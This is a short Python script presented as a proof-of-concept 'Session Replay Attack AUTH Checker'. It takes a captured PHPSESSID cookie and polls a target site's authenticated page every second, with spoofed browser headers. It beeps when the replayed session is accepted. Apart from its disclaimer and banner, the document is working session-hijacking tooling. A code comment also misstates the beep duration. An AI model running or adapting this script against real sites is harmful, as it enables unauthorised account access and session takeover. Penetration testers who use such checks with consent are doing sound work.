# - DISCLAIMER -
# This has been developed for PoC testing and demo purposes
# This code is not intended for passive testing, consent is required.
# Diverging from the above could result in criminal penalty!
# --------------

import requests
import datetime
import time
import winsound
frequency = 2500  # Set Frequency To 2500 Hertz
duration = 500  # Set Duration To 1000 ms == 1 second
banner = ("########################################\n"
          "## Session Replay Attack AUTH Checker ##\n"
          "##           WWW.WEBSEC.NL            ##\n"
          "########################################")
print(banner+"\n")

session = raw_input("Session Cookie Value: ")

cookies = dict(PHPSESSID=session)

def CheckSession():
    url = ("HERE YOU SHOULD PUT THE URL TO THE AUTHENTICATED AREA OF YOUR TARGET")

    headers = {
        'accept-encoding': "gzip, deflate",
        'accept-language': "en-US,en;q=0.9",
        'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
        'accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        'Sec-Fetch-Site': "none",
        'Sec-Fetch-Mode': "navigate",
        'Sec-Fetch-User': "?1",
        'Sec-Fetch-Dest': "document",
        'Connection': "close"
    }

    response = requests.request("GET", url, headers=headers, cookies=cookies)
    status = response.status_code
    memory = response.text
    if status == int(200):
        start = ("<div class=\"txt-area\">")
        end = ("</div>")
        mail = (memory[memory.find(start) + len(start):memory.rfind(end)])
        if 'Your Account name' in mail:
            print("[+] VALID SESSION DETECTED AT: " + str(datetime.datetime.now()))
            winsound.Beep(frequency, duration)
        else:
            print("[!] INVALID SESSION, RETRYING...")
        return [mail]
    else:
        print("[!] Something went wrong!")

CheckSession()

while True:
    time.sleep(1)
    CheckSession()
